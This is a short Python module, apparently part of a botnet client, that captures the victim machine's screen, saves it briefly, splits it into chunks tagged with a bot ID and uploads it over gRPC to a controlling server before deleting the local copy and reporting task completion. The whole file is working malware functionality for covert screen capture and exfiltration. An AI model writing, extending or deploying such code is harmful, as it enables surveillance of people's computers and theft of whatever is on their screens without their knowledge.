import pyscreeze
from io import BytesIO
import os
from bot.modules import files, tiempo
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *

def pic():
    objImage = pyscreeze.screenshot()
    with BytesIO() as objBytes:
        objImage.save(objBytes, format="PNG")
        bytes = objBytes.getvalue()
    return bytes

def screenshot(client, task):
    bytes = pic()
    files.save_file("./screen.png", bytes)
    array = []
    filename = f"SCREENSHOT {task.task_id}.png"
    status = ""
    if files.exist("./screen.png"):
        array.append(Chunk(bot_id=task.bot_id, status="OK", filename=filename, data=b""))
        for data in files.read_chunks("./screen.png"):
            array.append(Chunk(bot_id=task.bot_id, status="OK", filename="", data=data))
        status = "OK"
        os.remove("./screen.png")
    else:
        status = "MISSING"
    iterator = iter(array)
    r = client.SendFile(iterator)
    date_finish = tiempo.get_time()
    return Task(task_id=task.task_id, bot_id=task.bot_id, type=task.type, status=status, date_start=task.date_start, date_finish=date_finish)